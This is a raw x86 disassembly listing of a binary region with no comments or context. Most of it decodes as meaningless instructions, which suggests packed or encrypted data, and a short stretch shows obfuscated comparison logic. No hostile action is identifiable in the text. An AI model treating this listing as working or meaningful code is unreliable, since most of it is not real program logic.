  41dfbe:	push   esp
  41dfbf:	popf   
  41dfc0:	or     DWORD PTR [ebp+0xc],ecx
  41dfc3:	xor    edx,esp
  41dfc5:	xchg   esp,eax
  41dfc6:	jl     0x41df7c
  41dfc8:	sub    eax,0xfae65090
  41dfcd:	mov    edx,0x8ae284a1
  41dfd2:	icebp  
  41dfd3:	jmp    0x8e20fca7
  41dfd8:	scas   eax,DWORD PTR es:[edi]
  41dfd9:	(bad)  
  41dfda:	arpl   cx,si
  41dfdc:	dec    eax
  41dfdd:	mov    bl,0x7e
  41dfdf:	js     0x41dfe2
  41dfe1:	adc    ah,bl
  41dfe3:	push   ds
  41dfe4:	ins    BYTE PTR es:[edi],dx
  41dfe5:	xlat   BYTE PTR ds:[ebx]
  41dfe6:	mov    esp,0x98504d60
  41dfeb:	xchg   BYTE PTR [ebx+0x32e5da69],cl
  41dff1:	fild   QWORD PTR [ecx-0x71b93689]
  41dff7:	mov    edi,0x4eb7eb92
  41dffc:	ror    ebp,0x8e
  41dfff:	fbld   TBYTE PTR [ebp-0x1c]
  41e002:	add    eax,0x7357fb1e
  41e007:	mov    eax,0x93914fd0
  41e00c:	xor    ah,BYTE PTR [eax+0x4a]
  41e00f:	sbb    BYTE PTR [edi+eiz*4],dl
  41e012:	mov    ah,0xe0
  41e014:	adc    ebp,edi
  41e016:	inc    ecx
  41e017:	mov    eax,0x196099db
  41e01c:	cli    
  41e01d:	fdiv   QWORD PTR [esi+0x5ca3805d]
  41e023:	xchg   ecx,eax
  41e024:	loop   0x41dfe2
  41e026:	inc    ebp
  41e027:	ins    BYTE PTR es:[edi],dx
  41e028:	test   BYTE PTR [edx+0x12],ch
  41e02b:	into   
  41e02c:	xor    cl,cl
  41e02e:	ja     0x41e0ae
  41e030:	nop
  41e031:	pop    ebx
  41e032:	add    ah,BYTE PTR [ecx]
  41e034:	bound  esi,QWORD PTR [ecx-0x31303f41]
  41e03a:	(bad)  
  41e03c:	xor    ebx,DWORD PTR [ebx+0x10ea1d3a]
  41e042:	mov    dh,0xb8
  41e044:	mov    ds:0xf10daaaa,al
  41e049:	jno    0x41e081
  41e04b:	test   eax,0x1c5febc7
  41e050:	mov    al,0xc6
  41e052:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e053:	sbb    dh,BYTE PTR [eax+0x1]
  41e056:	pop    ebp
  41e057:	test   BYTE PTR [ecx+0x51c25950],ah
  41e05d:	jae    0x41e0d5
  41e05f:	lods   eax,DWORD PTR ds:[esi]
  41e060:	xlat   BYTE PTR ds:[ebx]
  41e061:	ret    
  41e062:	cdq    
  41e063:	sbb    bh,dl
  41e065:	adc    BYTE PTR [eax+0x4b],bl
  41e068:	sub    eax,0x2e5b381b
  41e06d:	jge    0x41e0b8
  41e06f:	outs   dx,BYTE PTR ds:[esi]
  41e070:	push   0x5c
  41e072:	or     BYTE PTR [ebx+0x1694abe6],cl
  41e078:	daa    
  41e079:	push   ds
  41e07a:	adc    eax,0xf5151ec9
  41e07f:	push   cs
  41e080:	mov    ebp,0x38034b8d
  41e085:	add    al,0xaa
  41e087:	data16 or bh,ah
  41e08a:	call   0xf711b5dc
  41e08f:	sbb    ch,ch
  41e091:	mov    edx,0x7b22044f
  41e096:	sub    edi,esi
  41e098:	cmp    BYTE PTR [eax],cl
  41e09a:	and    dh,0x44
  41e09d:	inc    eax
  41e09e:	pcmpgtb mm3,QWORD PTR [edi+0x6b3620b9]
  41e0a5:	pop    edx
  41e0a6:	inc    edx
  41e0a7:	mov    ds:0x5f8f0fdd,eax
  41e0ac:	(bad)  
  41e0ad:	sub    BYTE PTR [eax],ch
  41e0af:	(bad)  
  41e0b1:	test   DWORD PTR [ebp-0x1d],eax
  41e0b4:	pop    es
  41e0b5:	popf   
  41e0b6:	add    eax,0x2fe47bff
  41e0bb:	pop    ecx
  41e0bc:	sbb    bh,dh
  41e0be:	push   0x105379ba
  41e0c3:	jno    0x41e07d
  41e0c5:	sbb    al,0xcd
  41e0c7:	jge    0x41e0db
  41e0c9:	dec    ebp
  41e0ca:	pop    es
  41e0cb:	cld    
  41e0cc:	mov    esp,0x87360778
  41e0d1:	sar    DWORD PTR [edx-0x7a4a59e2],1
  41e0d7:	sbb    BYTE PTR [edx+edi*2+0x4f171b6e],ch
  41e0de:	and    al,0x86
  41e0e0:	outs   dx,BYTE PTR ds:[esi]
  41e0e1:	neg    DWORD PTR [ebp+0x4d]
  41e0e4:	mov    ds:0x571bbdca,al
  41e0e9:	add    BYTE PTR [eax-0x36b31867],al
  41e0ef:	push   esi
  41e0f0:	sbb    DWORD PTR [eax],ebp
  41e0f2:	inc    ebp
  41e0f3:	and    DWORD PTR [eax-0x3a],0xd819233f
  41e0fa:	out    0x2c,al
  41e0fc:	lods   al,BYTE PTR ds:[esi]
  41e0fd:	or     al,0xe4
  41e0ff:	push   0x973ab24d
  41e104:	loope  0x41e096
  41e106:	sub    edi,DWORD PTR [ecx+0x362edbab]
  41e10c:	icebp  
  41e10d:	in     eax,dx
  41e10e:	and    eax,0xf4d83372
  41e113:	xchg   ecx,eax
  41e114:	in     al,0x8a
  41e116:	sub    edx,DWORD PTR [ebx-0x39]
  41e119:	inc    esp
  41e11a:	and    al,0x10
  41e11c:	sbb    al,BYTE PTR [edx+0x0]
  41e11f:	add    BYTE PTR [ebx+0x25102444],cl
  41e125:	inc    esp
  41e126:	ret    0xffff
  41e129:	add    eax,DWORD PTR [esp+0x30]
  41e12d:	and    eax,0xfffffe5a
  41e132:	sub    eax,0x2ae1
  41e137:	and    eax,0x6f90
  41e13c:	mov    DWORD PTR [esp+0x30],eax
  41e140:	mov    DWORD PTR [esp+0x10],0x1515
  41e148:	mov    eax,DWORD PTR [esp+0x10]
  41e14c:	mov    ecx,DWORD PTR [esp+0x30]
  41e150:	or     eax,0x7113
  41e155:	add    eax,0x3d6a
  41e15a:	cmp    ecx,eax
  41e15c:	je     0x41e9ea
  41e162:	mov    eax,DWORD PTR [esp+0x40]
  41e166:	mov    edx,DWORD PTR [esp+0x18]
  41e16a:	mov    edi,DWORD PTR [esp+0x1c]
  41e16e:	xor    ecx,ecx
  41e170:	shld   ecx,eax,0x2
  41e174:	shl    eax,0x2
  41e177:	xor    eax,ebx
  41e179:	xor    ecx,esi
  41e17b:	cmp    eax,edx
  41e17d:	jne    0x41e18b
  41e183:	cmp    ecx,edi
  41e185:	je     0x41e9a3
  41e18b:	mov    eax,DWORD PTR [esp+0x44]
  41e18f:	mov    eax,DWORD PTR [esp+0x44]
  41e193:	mov    eax,DWORD PTR [esp+0x44]
  41e197:	mov    ecx,DWORD PTR [esp+0x44]
  41e19b:	xor    eax,0xa4069aaf
  41e1a0:	xor    ecx,0xfffffffe
  41e1a3:	shr    eax,0x2
  41e1a6:	shl    ecx,0x1e
  41e1a9:	or     eax,ecx
  41e1ab:	xor    ecx,ecx
  41e1ad:	shld   ecx,eax,0x2
  41e1b1:	shl    eax,0x2
  41e1b4:	xor    eax,ebx
  41e1b6:	xor    ecx,esi
  41e1b8:	cmp    eax,0xca79a571
  41e1bd:	jne    0x41e1cb
  41e1c3:	cmp    ecx,esi
  41e1c5:	je     0x41e9ea
  41e1cb:	mov    eax,DWORD PTR [esp+0x60]
  41e1cf:	cdq    
  41e1d0:	mov    eax,DWORD PTR [esp+0x60]
  41e1d4:	mov    ecx,edx
  41e1d6:	cdq    
  41e1d7:	shld   edx,eax,0x2
  41e1db:	shr    ecx,0x1e
  41e1de:	xor    edi,edi
  41e1e0:	jmp    0x41e5af
  41e1e5:	inc    esp
  41e1e6:	mov    eax,ds:0x1a1c22c9
  41e1eb:	and    bl,BYTE PTR [edi+0x7e4d5dcf]
  41e1f1:	loopne 0x41e22f
  41e1f3:	addr16 mov esp,0x18163fc6
  41e1f9:	mov    esp,0x60181812
  41e1fe:	rcl    DWORD PTR [edi-0x21],1
  41e201:	dec    ebp
  41e202:	lods   eax,DWORD PTR ds:[esi]
  41e203:	sahf   
  41e204:	hlt    
  41e205:	cdq    
  41e206:	fwait
  41e207:	arpl   cx,bx
  41e209:	es (bad) 
  41e20b:	rcl    DWORD PTR [edx+0x7d],cl
  41e20e:	int    0x69
  41e210:	retf   
  41e211:	xor    ebp,eax
  41e213:	xlat   BYTE PTR ds:[ebx]
  41e214:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e215:	inc    edx
  41e216:	mov    edx,0x104fe7b5
  41e21b:	mov    eax,ds:0xeb16c004
  41e220:	mov    ebp,0xe9eea77a
  41e225:	push   ebx
  41e226:	ja     0x41e1f1
  41e228:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e229:	jle    0x41e269
  41e22b:	push   eax
  41e22c:	push   ss
  41e22d:	popf   
  41e22e:	(bad)  
  41e22f:	je     0x41e223
  41e231:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e232:	inc    eax
  41e233:	xlat   BYTE PTR ds:[ebx]
  41e234:	push   edx
  41e235:	inc    esi
  41e236:	mov    cs,WORD PTR [ecx]
  41e238:	lods   al,BYTE PTR ds:[esi]
  41e239:	sti    
  41e23a:	xchg   BYTE PTR [ebx],dh
  41e23c:	pop    esp
  41e23d:	leave  
  41e23e:	cmp    BYTE PTR [edx],ah
  41e240:	stos   DWORD PTR es:[edi],eax
  41e241:	mov    ecx,0xca2e2b1a
  41e246:	mulps  xmm6,XMMWORD PTR [ebp+ecx*8-0x77]
  41e24b:	les    ebp,FWORD PTR [ebx+0x1f786df1]
  41e251:	mov    al,0x54
  41e253:	push   edi
  41e254:	in     eax,dx
  41e255:	in     al,dx
  41e256:	mov    WORD PTR [edi+0x180f746c],gs
  41e25c:	xor    edi,ebp
  41e25e:	and    eax,0x705b6105
  41e263:	test   eax,0xf235c5e
  41e268:	mov    ecx,0xcfb83b1c
  41e26d:	pop    eax
  41e26e:	xchg   eax,eax
  41e270:	sbb    ecx,DWORD PTR [edi]
  41e272:	jle    0x41e1fd
  41e274:	mov    eax,ds:0x4b0f6b37
  41e279:	inc    edi
  41e27a:	test   DWORD PTR [eax],edx
  41e27c:	out    dx,eax
  41e27d:	nop
  41e27e:	rol    esi,1
  41e280:	push   0x79
  41e282:	cld    
  41e283:	and    al,0x37
  41e285:	cmp    BYTE PTR [ecx],ch
  41e287:	adc    al,BYTE PTR [ebx]
  41e289:	das    
  41e28a:	xlat   BYTE PTR ds:[ebx]
  41e28b:	pop    ecx
  41e28c:	daa    
  41e28d:	stos   DWORD PTR es:[edi],eax
  41e28e:	inc    esi
  41e28f:	lods   eax,DWORD PTR ds:[esi]
  41e290:	pop    ds
  41e291:	push   cs
  41e292:	cmp    edi,DWORD PTR [ebx-0x56]
  41e295:	or     DWORD PTR [eax+0x39],esi
  41e298:	scas   al,BYTE PTR es:[edi]
  41e299:	imul   edx,DWORD PTR ds:0xab52468e,0x3b
  41e2a0:	in     eax,0xd0
  41e2a2:	lods   al,BYTE PTR ds:[esi]
  41e2a3:	mov    BYTE PTR [esp+edi*2-0x45],dh
  41e2a7:	int3   
  41e2a8:	jecxz  0x41e24a
  41e2aa:	daa    
  41e2ab:	add    eax,0x515ed3be
  41e2b0:	sbb    DWORD PTR [edi+eiz*4+0x4848074d],eax
  41e2b7:	adc    BYTE PTR [edx-0x7d],ch
  41e2ba:	(bad)  
  41e2bb:	mov    bh,0x11
  41e2bd:	test   DWORD PTR [esi-0x59fc4030],esp
  41e2c3:	stc    
  41e2c4:	push   ds
  41e2c5:	(bad)  
  41e2c7:	pop    edx
  41e2c8:	test   DWORD PTR [edx-0x6df9272e],0x909181f3
  41e2d2:	shl    BYTE PTR [ebx+0x56],cl
  41e2d5:	mov    edi,DWORD PTR [eax-0x7f]
  41e2d8:	mov    eax,0x7fb45ed
  41e2dd:	shl    DWORD PTR [edi+0x2a],1
  41e2e0:	sti    
  41e2e1:	and    dh,BYTE PTR [eax]
  41e2e3:	jo     0x41e30a
  41e2e5:	pop    ss
  41e2e6:	push   ss
  41e2e7:	or     eax,0x5ebf304
  41e2ec:	cs retf 0xd1fa
  41e2f0:	fbld   TBYTE PTR ds:0x557e3f9d
  41e2f6:	lods   al,BYTE PTR ds:[esi]
  41e2f7:	dec    esi
  41e2f8:	mov    ch,0x41
  41e2fa:	jp     0x41e29e
  41e2fc:	push   0x62
  41e2fe:	ror    DWORD PTR [ebp-0x3f28240c],1
  41e304:	and    al,0xe2
  41e306:	xor    al,0x11
  41e308:	arpl   WORD PTR [ebp-0x7c],cx
  41e30b:	jge    0x41e2da
  41e30d:	push   ss
  41e30e:	outs   dx,DWORD PTR ds:[esi]
  41e30f:	dec    ebp
  41e310:	mov    al,0x1f
  41e312:	shl    BYTE PTR [edi+eax*2+0x66],cl
  41e316:	ficom  DWORD PTR [ecx+0x76]
  41e319:	sbb    eax,DWORD PTR [ebx]
  41e31b:	adc    DWORD PTR [edx-0x39161300],eax
  41e321:	jne    0x41e320
  41e323:	aad    0xb1
  41e325:	jmp    0x41e2e3
  41e327:	add    al,0xa7
  41e329:	clc    
  41e32a:	mov    dl,0x27
  41e32c:	xor    bl,BYTE PTR [eax-0x6b]
  41e32f:	mov    al,ds:0xc976edf7
  41e334:	push   eax
  41e335:	stc    
  41e336:	adc    al,0x2e
  41e338:	inc    eax
  41e339:	clc    
  41e33a:	lods   al,BYTE PTR ds:[esi]
  41e33b:	or     dl,BYTE PTR [eax-0x3c5d7f1f]
  41e341:	pop    eax
  41e342:	pop    ds
  41e343:	out    dx,al
  41e344:	mov    al,es:0x268b4293
  41e34a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e34b:	daa    
  41e34c:	sbb    BYTE PTR [edx+0x22f0c364],dh
  41e352:	dec    ebp
  41e353:	cmp    eax,0xd4ff4b02
  41e358:	in     al,0xcc
  41e35a:	pop    ebx
  41e35b:	xor    al,BYTE PTR es:[esp+ecx*1]
  41e35f:	push   0xfffffff7
  41e361:	test   DWORD PTR ds:[eax],ecx
  41e364:	ins    DWORD PTR es:[edi],dx
  41e365:	jge    0x41e378
  41e367:	jecxz  0x41e339
  41e369:	xor    BYTE PTR [edi-0x28],0xdc
  41e36d:	fidiv  WORD PTR [edx]
  41e36f:	jbe    0x41e3d1
  41e371:	dec    edi
  41e372:	or     al,0x82
  41e374:	dec    edi
  41e375:	and    eax,0x4e5dea99
  41e37a:	rcl    BYTE PTR [ebx+0x56e02947],cl
  41e380:	and    BYTE PTR [eax+0x212d07c5],cl
  41e386:	or     esi,DWORD PTR [edx]
  41e388:	jmp    0x220d:0xf4f6a21f
  41e38f:	mov    ds:0xf91acafe,eax
  41e394:	loope  0x41e3dc
  41e396:	xor    BYTE PTR [ebx-0x47],ah
  41e399:	mov    ecx,0xb72ba3b8
  41e39e:	mov    ah,0xe2
  41e3a0:	les    edi,FWORD PTR [edx+ecx*4-0x69]
  41e3a4:	sbb    DWORD PTR [edx],edx
  41e3a6:	and    DWORD PTR [eax-0x41f2a979],ebx
  41e3ac:	xor    edx,DWORD PTR [eax-0x85e3697]
  41e3b2:	add    edx,ecx
  41e3b4:	mov    DWORD PTR [ebp+0x72],ebx
  41e3b7:	daa    
  41e3b8:	mov    ecx,0xad5de426
  41e3bd:	cmp    esi,DWORD PTR [eax+0xa]
  41e3c0:	out    0xd8,al
  41e3c2:	ficomp DWORD PTR [edx-0x56f85101]
  41e3c8:	cs retf 
  41e3ca:	imul   BYTE PTR [eax]
  41e3cc:	lods   eax,DWORD PTR ds:[esi]
  41e3cd:	adc    esi,DWORD PTR gs:[edx]
  41e3d0:	mov    ds:0x43ef83ad,eax
  41e3d5:	pop    edi
  41e3d6:	aas    
  41e3d7:	aam    0xad
  41e3d9:	sar    ebp,0x80
  41e3dc:	fidivr DWORD PTR [ebp+0x61dedc27]
  41e3e2:	cmp    ebx,DWORD PTR [ebx+0x15]
  41e3e5:	adc    dh,BYTE PTR [edi+0x5fc3829]
  41e3eb:	inc    esi
  41e3ec:	jge    0x41e421
  41e3ee:	ror    DWORD PTR [ecx+edx*1-0x27],cl
  41e3f2:	ss inc bh
  41e3f5:	mov    ch,0xa9
  41e3f7:	leave  
  41e3f8:	mov    esp,DWORD PTR [edx-0x1a]
  41e3fb:	ins    DWORD PTR es:[edi],dx
  41e3fc:	add    ebx,edx
  41e3fe:	sbb    ah,bl
  41e400:	dec    ebx
  41e401:	dec    ecx
  41e402:	push   0xffffffa6
  41e404:	add    DWORD PTR [ecx],esi
  41e406:	push   DWORD PTR [esi-0x32842595]
  41e40c:	mov    cl,0x14
  41e40e:	jl     0x41e39a
  41e410:	lods   al,BYTE PTR ds:[esi]
  41e411:	push   ds
  41e412:	mov    ebp,DWORD PTR [ebx]
  41e414:	ss jmp 0x97395d6c
  41e41a:	jmp    0xfc8b:0xec1a7c68
  41e421:	sar    BYTE PTR [edx],1
  41e423:	sub    eax,0xdef97f6d
  41e428:	jne    0x41e497
  41e42a:	mov    ebp,0x6b2cf9e5
  41e42f:	arpl   WORD PTR [ebx+esi*8],sp
  41e432:	popf   
  41e433:	(bad)  
  41e434:	adc    eax,0x201f675a
  41e439:	dec    edx
  41e43a:	aaa    
  41e43b:	and    dh,BYTE PTR [ecx+0x3ce68fcc]
  41e441:	retf   
  41e442:	and    eax,0xdce08ff9
  41e447:	add    dl,BYTE PTR [ecx-0x15c73521]
  41e44d:	lea    esp,[ecx+0x231bca70]
  41e453:	ins    DWORD PTR es:[edi],dx
  41e454:	jmp    0x41e413
  41e456:	int3   
  41e457:	pop    es
  41e458:	sahf   
  41e459:	push   0x76
  41e45b:	lds    edx,FWORD PTR [edi+0x2b12df10]
  41e461:	dec    ecx
  41e462:	std    
  41e463:	loop   0x41e415
  41e465:	in     eax,0xa
  41e467:	ret    0xaf85
  41e46a:	adc    eax,0x3df6c68
  41e46f:	loope  0x41e4e9
  41e471:	mov    dl,cl
  41e473:	ins    BYTE PTR es:[edi],dx
  41e474:	enter  0xa182,0xb5
  41e478:	imul   esi
  41e47a:	pcmpgtd mm5,QWORD PTR [edx+esi*2]
  41e47e:	sbb    dh,BYTE PTR [esi+eiz*2-0x23]
  41e482:	xor    BYTE PTR [esi-0x54],ch
  41e485:	and    eax,0x2d692c95
  41e48a:	inc    esp
  41e48b:	mov    ebx,0xd897fb7d
  41e490:	or     al,0x3e
  41e492:	and    eax,0x892f77f0
  41e497:	xlat   BYTE PTR ds:[ebx]
  41e498:	xlat   BYTE PTR ds:[ebx]
  41e499:	inc    ebx
  41e49a:	nop
  41e49b:	outs   dx,BYTE PTR ds:[esi]
  41e49c:	das    
  41e49d:	rcl    ebp,0x75
  41e4a0:	jno    0x41e4d1
  41e4a2:	loope  0x41e486
  41e4a4:	sub    eax,0xd7af805d
  41e4a9:	and    eax,0xb5f324c
  41e4ae:	mov    ch,0xf1
  41e4b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e4b1:	inc    esp
  41e4b2:	fidivr DWORD PTR [edi-0x43cd8090]
  41e4b8:	sub    esp,esi
  41e4ba:	inc    ecx
  41e4bb:	or     eax,0x7031af4b
  41e4c0:	clc    
  41e4c1:	mov    dl,0x32
  41e4c3:	aam    0x81
  41e4c5:	fwait
  41e4c6:	test   BYTE PTR [edx-0x62],dl
  41e4c9:	sbb    ebx,DWORD PTR [ecx+0x230371c5]
  41e4cf:	mov    dl,0xac
  41e4d1:	ss imul edx,ebp,0x26d0bc13
  41e4d8:	sar    DWORD PTR [ecx+0x23],0xdb
  41e4dc:	outs   dx,BYTE PTR ds:[esi]
  41e4dd:	adc    BYTE PTR [ebx+0x78cc6b64],bl
  41e4e3:	pop    ss
  41e4e4:	das    
  41e4e5:	mov    bh,0xc6
  41e4e7:	repz jle 0x41e47e
  41e4ea:	mov    BYTE PTR [ecx],0x31
  41e4ed:	sbb    esi,DWORD PTR [eax+0x54]
  41e4f0:	mov    ds,WORD PTR [ebx]
  41e4f2:	out    0x9a,eax
  41e4f4:	push   ebp
  41e4f5:	push   0xecf4f395
  41e4fa:	popf   
  41e4fb:	or     dl,BYTE PTR [esi-0x50]
  41e4fe:	sbb    BYTE PTR [esi+0x7190d583],ah
  41e504:	or     eax,0x48419166
  41e509:	add    ebp,edx
  41e50b:	stos   DWORD PTR es:[edi],eax
  41e50c:	mov    ah,0x70
  41e50e:	or     al,0x8e
  41e510:	push   edi
  41e511:	test   eax,0x300c59c7
  41e516:	out    dx,al
  41e517:	stos   BYTE PTR es:[edi],al
  41e518:	pop    esp
  41e519:	push   ebp
  41e51a:	popf   
  41e51b:	push   0x70
  41e51d:	add    BYTE PTR [ebp+0x3d],ch
  41e520:	mov    edx,DWORD PTR [edx]
  41e522:	add    BYTE PTR es:[esp+ebp*4],0x67
  41e527:	sbb    dl,BYTE PTR [ebx]
  41e529:	xor    bl,BYTE PTR [ecx-0x1a]
  41e52c:	sub    DWORD PTR [edx+0x3cf24b14],0xffffff93
  41e533:	mov    ch,0xb1
  41e535:	pop    edi
  41e536:	and    cl,BYTE PTR [ecx+0x1b52d7f1]
  41e53c:	xchg   ebx,eax
  41e53d:	cdq    
  41e53e:	dec    ebx
  41e53f:	std    
  41e540:	jns    0x41e4ed
  41e542:	les    ebp,FWORD PTR [edx]
  41e544:	mov    bh,0x94
  41e546:	fs mov esi,0xc4ef5097
  41e54c:	inc    ebp
  41e54d:	nop
  41e54e:	(bad)  
  41e54f:	scas   eax,DWORD PTR es:[edi]
  41e550:	lahf   
  41e551:	cmp    al,0x91
  41e553:	pop    edi
  41e555:	mov    edi,edi
  41e557:	retf   
  41e558:	dec    edx
  41e559:	fisttp QWORD PTR [edi-0x61579b76]
  41e55f:	test   DWORD PTR [eax+0x6e],edi
  41e562:	push   edx
  41e563:	addr16 nop
  41e565:	imul   ebp,eax,0x276854fa
  41e56b:	cmp    BYTE PTR [ebx],bl
  41e56d:	push   esi
  41e56e:	fisttp QWORD PTR [ebx+0x12]
  41e571:	cwde   
  41e572:	xchg   ebp,eax
  41e573:	and    esp,DWORD PTR [edx]
  41e575:	sub    esp,eax
  41e577:	mov    ecx,0xa816956b
  41e57c:	out    dx,eax
  41e57d:	xchg   esi,eax
  41e57e:	dec    edi
  41e57f:	jbe    0x41e5b8
  41e581:	adc    eax,0xe7ff093e
  41e586:	dec    edx
  41e587:	fdivr  QWORD PTR [esi]
  41e589:	ja     0x41e568
  41e58b:	xor    eax,0xa4a7ac12
  41e590:	inc    esi
  41e591:	popf   
  41e592:	xor    esp,edx
  41e594:	inc    esi
  41e595:	inc    esi
  41e596:	mov    bl,0xb
  41e598:	repz and ax,0xb534
  41e59d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e59e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e59f:	xlat   BYTE PTR ds:[ebx]
  41e5a0:	mov    dh,0x51
  41e5a2:	out    0xd7,al
  41e5a4:	push   edi
  41e5a5:	stc    
  41e5a6:	or     ebx,DWORD PTR [eax-0x27]
  41e5a9:	loop   0x41e5c2
  41e5ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5ac:	sbb    eax,0xe0c17467
  41e5b1:	add    cl,BYTE PTR [ebx]
  41e5b3:	shr    ecx,0xca
  41e5b6:	add    eax,DWORD PTR [eax]
  41e5b8:	add    BYTE PTR [esi+ecx*1+0x1e7a9f90],al
  41e5bf:	and    ch,BYTE PTR [edx]
  41e5c1:	xor    eax,0x55aae715
  41e5c6:	sub    DWORD PTR [edi+0x16376bbc],edx
  41e5cc:	sbb    BYTE PTR [edx+edx*1+0x1bd11818],bh
  41e5d3:	adc    bl,bh
  41e5d5:	pop    esi
  41e5d6:	js     0x41e5f4
  41e5d8:	push   eax
  41e5d9:	shl    BYTE PTR [esi-0x80],1
  41e5dc:	sar    DWORD PTR [edi-0x7039c53c],1
  41e5e2:	test   al,0x48
  41e5e4:	cmp    cl,BYTE PTR [edi+0x0]
  41e5e7:	popf   
  41e5e8:	sbb    BYTE PTR [edx],ah
  41e5ea:	loope  0x41e65a
  41e5ec:	sub    dh,BYTE PTR [edi-0x3e]
  41e5ef:	add    al,0xd6
  41e5f1:	dec    esi
  41e5f2:	(bad)  
  41e5f3:	jp     0x41e5ea
  41e5f5:	xlat   BYTE PTR ds:[ebx]
  41e5f6:	ja     0x41e5b0
  41e5f8:	std    
  41e5f9:	mov    ?,ebp
  41e5fb:	iret   
  41e5fc:	jns    0x41e5ff
  41e5fe:	mov    esi,0xeb2d422e
  41e603:	and    ebp,eax
  41e605:	fsub   QWORD PTR [eax-0x34]
  41e608:	mov    WORD PTR [edi],?
  41e60a:	out    dx,al
  41e60b:	push   cs
  41e60c:	iret   
  41e60d:	push   edi
  41e60e:	push   ebp
  41e60f:	jae    0x41e5e8
  41e611:	sub    eax,DWORD PTR gs:[ebp+0x78]
  41e615:	push   es
  41e616:	scas   eax,DWORD PTR es:[edi]
  41e617:	out    0xdd,al
  41e619:	pop    ebx
  41e61a:	outs   dx,DWORD PTR ds:[esi]
  41e61b:	xchg   esp,eax
  41e61c:	adc    al,0xe4
  41e61e:	cmp    DWORD PTR [eax],ebp
  41e620:	mov    DWORD PTR [ecx+0x4ccbf65a],0x12ae3559
  41e62a:	hlt    
  41e62b:	jecxz  0x41e650
  41e62d:	xchg   esi,eax
  41e62e:	cmp    BYTE PTR [esi-0x7c],dh
  41e631:	ds cld 
  41e633:	test   al,0x7d
  41e635:	or     eax,0xad4fa651
  41e63a:	repnz imul edi,DWORD PTR [ebx-0x67],0x3c8081d3
  41e642:	or     DWORD PTR [esi],edi
  41e644:	add    cl,ch
  41e646:	in     al,0x45
  41e648:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e649:	cmp    al,BYTE PTR [eax]
  41e64b:	iret   
  41e64c:	sub    DWORD PTR ds:0x4048e5e5,edi
  41e652:	pop    ebp
  41e653:	aas    
  41e654:	test   DWORD PTR [ebp+0x70],edx
  41e657:	sbb    BYTE PTR [ecx+0x7a],al
  41e65a:	addr16 cmc 
  41e65c:	dec    esp
  41e65d:	jne    0x41e604
  41e65f:	mov    ebx,0xc03abdc9
  41e664:	xchg   ecx,eax
  41e665:	repnz mov esi,0xd342f493
  41e66b:	cli    
  41e66c:	mov    ds:0xc58b96e,al
  41e671:	fcom   DWORD PTR [edi+esi*4]
  41e674:	jb     0x41e68e
  41e676:	pop    ebx
  41e677:	push   ecx
  41e678:	repnz mov dh,0xe4
  41e67b:	out    dx,al
  41e67c:	dec    ecx
  41e67d:	mov    ah,0x34
  41e67f:	add    BYTE PTR [ebp+0x39d4304e],al
  41e685:	int    0x2e
  41e687:	jge    0x41e627
  41e689:	mov    edx,0x4a70430e
  41e68e:	sub    DWORD PTR [ebp+0x483fd5e7],0x73
  41e695:	push   ebx
  41e696:	dec    ecx
  41e697:	daa    
  41e698:	push   cs
  41e699:	outs   dx,DWORD PTR ds:[esi]
  41e69a:	add    eax,0x2dfd739c
  41e69f:	dec    ebp
  41e6a0:	cdq    
  41e6a1:	ds es std 
  41e6a4:	rol    BYTE PTR [ebp+eiz*8-0x1e0c924c],1
  41e6ab:	mov    cl,0xe0
  41e6ad:	jne    0x41e69d
  41e6af:	cld    
  41e6b0:	jg     0x41e6b8
  41e6b2:	inc    esi
  41e6b3:	pushf  
  41e6b4:	lock mov ah,0x4d
  41e6b7:	or     ch,bh
  41e6b9:	dec    ecx
  41e6ba:	popa   
  41e6bb:	push   0x7b
  41e6bd:	test   al,0x17
  41e6bf:	ins    BYTE PTR es:[edi],dx
  41e6c0:	test   DWORD PTR [eax-0x4050c965],ebp
  41e6c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e6c7:	jo     0x41e688
  41e6c9:	jb     0x41e6b6
  41e6cb:	rcl    ebp,1
  41e6cd:	add    dl,bl
  41e6cf:	jmp    FWORD PTR [ecx-0x6f]
  41e6d2:	add    BYTE PTR [edx],cl
  41e6d4:	retf   0xb0d
  41e6d7:	rcl    DWORD PTR [ecx-0x360e79dc],cl
  41e6dd:	arpl   WORD PTR [edx+ecx*8],di
  41e6e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6e1:	adc    esi,ecx
  41e6e3:	xchg   esi,eax
  41e6e4:	mov    ch,0x89
  41e6e6:	jp     0x41e717
  41e6e8:	scas   eax,DWORD PTR es:[edi]
  41e6e9:	bsf    ebx,esi
  41e6ec:	(bad)  
  41e6ed:	sti    
  41e6ee:	inc    esi
  41e6ef:	packuswb mm7,QWORD PTR [edi+0x7f]
  41e6f3:	fs inc ebx
  41e6f5:	add    BYTE PTR [ebp+0x3bbaee15],ah
  41e6fb:	adc    BYTE PTR [edi-0x21],0x86
  41e6ff:	pop    es
  41e700:	cmp    esp,DWORD PTR [ecx]
  41e702:	es jle 0x41e6d5
  41e705:	mov    al,0xc1
  41e707:	cdq    
  41e708:	push   eax
  41e709:	pop    ss
  41e70a:	jae    0x41e744
  41e70c:	xor    BYTE PTR [edi],bh
  41e70e:	mov    ebx,0xd8052fda
  41e713:	sti    
  41e714:	out    dx,al
  41e715:	mov    dl,0x87
  41e717:	and    al,0x60
  41e719:	and    eax,0x6ed2f301
  41e71e:	xchg   ecx,eax
  41e71f:	gs inc esp
  41e721:	add    bl,BYTE PTR [ebx+0x68]
  41e724:	dec    esi
  41e725:	sbb    ecx,eax
  41e727:	jb     0x41e73c
  41e729:	jmp    0x41e797
  41e72b:	jb     0x41e748
  41e72d:	pop    edx
  41e72e:	int3   
  41e72f:	ret    
  41e730:	and    eax,DWORD PTR ss:[ebx]
  41e733:	add    al,0xf0
  41e735:	lods   al,BYTE PTR ds:[esi]
  41e736:	outs   dx,BYTE PTR ds:[esi]
  41e737:	push   ds
  41e738:	fbld   TBYTE PTR [ebx+0x63a0dfe2]
